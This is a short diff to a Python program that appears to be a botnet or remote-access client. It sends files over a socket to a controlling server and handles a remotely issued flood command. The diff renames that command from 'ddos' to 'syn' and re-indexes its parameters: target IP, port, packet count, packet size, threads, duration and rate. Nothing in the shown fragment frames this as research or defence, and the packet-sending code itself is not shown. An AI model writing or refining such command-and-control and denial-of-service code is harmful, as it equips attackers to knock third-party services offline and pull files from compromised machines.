@@ -88,20 +88,20 @@ if server_ready == "ready":
             with open(file_path, "rb") as f:
                 client_socket.send(f.read())
         
-        elif command_to_execute.split(" ")[0] == "ddos":
+        elif command_to_execute.split(" ")[0] == "syn":
             counter_lock = threading.Lock()
             sent_packets = 0
             stop_threads = False
 
             command_ls = command_to_execute.split(" ")
-            attack_mode = command_ls[1]
-            target_ip = command_ls[2]
-            target_port = int(command_ls[3])
-            number_of_packets = int(command_ls[4])
-            packet_size = int(command_ls[5])
-            number_of_threads = int(command_ls[6])
-            attack_duration = int(command_ls[7])
-            attack_rate = int(command_ls[8])
+            attack_mode = command_ls[0]
+            target_ip = command_ls[1]
+            target_port = int(command_ls[2])
+            number_of_packets = int(command_ls[3])
+            packet_size = int(command_ls[4])
+            number_of_threads = int(command_ls[5])
+            attack_duration = int(command_ls[6])
+            attack_rate = int(command_ls[7])
 
             start_time = time.time()
             delay = 1 / attack_rate
